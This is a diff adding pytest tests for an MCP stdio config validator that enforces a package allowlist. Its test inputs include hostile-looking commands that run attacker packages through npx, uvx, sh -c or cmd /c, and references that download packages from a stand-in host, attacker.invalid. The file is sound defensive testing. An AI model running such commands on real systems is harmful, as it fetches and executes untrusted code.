@@ -5,6 +5,8 @@ validators, closing the hole where a tenant-embedded MCP stdio config reached
 ``bash -c "exec <command>"`` without any allowlist/metacharacter checks.
 """
 
+from types import SimpleNamespace
+
 import pytest
 from lfx.base.mcp.security import (
     ALLOWED_MCP_COMMANDS,
@@ -270,6 +272,62 @@ def test_yes_flag_allowed_for_safe_commands():
 
     with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
         validate_mcp_stdio_config("node", ["--yes", "script.js"], {})
+
+
+@pytest.mark.parametrize(
+    ("command", "args"),
+    [
+        ("npx", ["--yes", "@attacker/owned-package"]),
+        ("uvx", ["attacker-package"]),
+        ("sh", ["-c", "uvx attacker-package"]),
+        ("cmd", ["/c", "npx", "@attacker/owned-package"]),
+        ("npx", ["--package", "@attacker/owned-package", "mcp-proxy"]),
+        ("uvx", ["--with", "attacker-package", "mcp-proxy"]),
+        ("uvx", ["--from", "lfx", "--with", "attacker-package", "lfx-mcp"]),
+    ],
+)
+def test_package_runner_allowlist_rejects_unapproved_packages(command, args):
+    with pytest.raises(MCPStdioSecurityError):
+        validate_mcp_stdio_config(command, args, {}, allowed_packages={"mcp-proxy", "lfx"})
+
+
+@pytest.mark.parametrize(
+    ("command", "args"),
+    [
+        ("npx", ["mcp-proxy@https://attacker.invalid/pkg.tgz"]),
+        ("uvx", ["mcp-proxy @ https://attacker.invalid/pkg.whl"]),
+        ("uvx", ["--from", "lfx@file:///tmp/attacker", "lfx-mcp"]),
+    ],
+)
+def test_package_runner_allowlist_rejects_direct_package_references(command, args):
+    with pytest.raises(MCPStdioSecurityError, match="registry package"):
+        validate_mcp_stdio_config(command, args, {}, allowed_packages={"mcp-proxy", "lfx"})
+
+
+@pytest.mark.parametrize(
+    ("command", "args", "allowed"),
+    [
+        (
+            "npx",
+            ["--yes", "@modelcontextprotocol/server-everything@1.2.3"],
+            {"@modelcontextprotocol/server-everything"},
+        ),
+        ("uvx", ["mcp-proxy==0.8.2", "--transport", "stdio"], {"mcp-proxy"}),
+        ("uvx", ["--from", "lfx==1.11", "lfx-mcp"], {"lfx"}),
+    ],
+)
+def test_package_runner_allowlist_preserves_approved_packages(command, args, allowed):
+    validate_mcp_stdio_config(command, args, {}, allowed_packages=allowed)
+
+
+def test_configured_package_allowlist_is_enforced_at_validation_sink(monkeypatch):
+    settings_service = SimpleNamespace(settings=SimpleNamespace(mcp_server_allowed_packages="mcp-proxy,lfx"))
+    monkeypatch.setattr("lfx.services.deps.get_settings_service", lambda: settings_service)
+
+    with pytest.raises(MCPStdioSecurityError, match="not allowed for MCP"):
+        validate_mcp_stdio_config("npx", ["--yes", "@attacker/owned-package"], {})
+
+    validate_mcp_stdio_config("uvx", ["mcp-proxy"], {})
 
 
 def test_combined_keywords_with_quotes():
